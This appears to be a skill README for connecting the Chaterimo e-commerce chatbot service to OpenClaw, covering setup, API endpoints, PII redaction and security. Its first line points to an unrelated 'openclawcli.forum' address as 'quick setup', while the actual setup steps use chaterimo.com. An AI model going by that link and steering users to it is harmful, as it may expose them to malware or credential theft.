# Chaterimo - AI Customer Service for Shopify & E-commerce
⏹ Quick setup here  -> https://openclawcli.forum


Connect your Chaterimo AI chatbot to OpenClaw. Query customer conversations, analyze chatbot performance, and get insights from your e-commerce store's customer service data.

## What is Chaterimo?

Chaterimo is an AI-powered customer service platform that integrates with **Shopify**, **Shoptet**, **Upgates**, and **eshop-rychle.cz** e-commerce platforms. It provides 24/7 automated customer support powered by leading LLM models: **ChatGPT**, **Claude**, **Gemini**, and **Grok**.

You can use Chaterimo with your own API keys (BYOK - Bring Your Own Key) or choose a custom plan with included AI credits.

## What can this skill do?

### List Your Chatbots
> "Show me all my chatbots"

Returns all chatbots configured for your store with their AI model settings and status.

### Browse Conversations
> "Show me conversations from last week"
> "List conversations from my Shopify store"

View customer service conversations with filters by date and platform. All customer PII is automatically stripped for privacy.

### Read Conversation Transcripts
> "Show me conversation #123"
> "What did customers ask about yesterday?"

Get full conversations with messages between customers and your AI chatbot. All personally identifiable information is automatically redacted.

## Setup

1. Sign up at [chaterimo.com](https://www.chaterimo.com)
2. Connect your e-commerce platform (Shopify, Shoptet, Upgates, or eshop-rychle.cz)
3. Go to **API Keys** in your dashboard
4. Click **Create API Key** and copy the key
5. Set the environment variable:
   ```
   CHATERIMO_API_KEY=cha_your_key_here
   ```

## API Endpoints

| Endpoint | Description |
|----------|-------------|
| `GET /api/v1/chatbots/` | List all chatbots (returns chatbot IDs) |
| `GET /api/v1/chatbots/{chatbot_id}/` | Get chatbot details |
| `GET /api/v1/chatbots/{chatbot_id}/conversations/` | List conversations (returns conversation IDs) |
| `GET /api/v1/conversations/{conversation_id}/` | Get full conversation with messages |

Your organisation is determined automatically from your API key - no need to specify it.

## Privacy & Data Security

### PII Redaction

All conversation data returned by the API has personally identifiable information (PII) automatically stripped to protect customer privacy:

| Data Type | Example | Redacted As |
|-----------|---------|-------------|
| Email addresses | `john@example.com` | `[EMAIL]` |
| Phone numbers | `+1-555-123-4567` | `[PHONE]` |

This ensures you can analyze conversation patterns and chatbot performance without exposing sensitive customer data.

### API Key Security

- **Hashed storage**: API keys are stored as SHA256 hashes - we never store your raw key in plain text
- **One-time display**: Your full API key is shown only once at creation - copy it immediately
- **Instant revocation**: Revoke compromised keys immediately from your dashboard
- **Scoped access**: Keys are scoped to specific permissions (read-only by default)

### Infrastructure Security

- **Rate limiting**: 60 requests/minute per API key to prevent abuse
- **Audit logging**: All API calls are logged with timestamps, endpoints, and response codes
- **Tenant isolation**: API keys can only access data from their own organisation
- **HTTPS only**: All API traffic is encrypted in transit
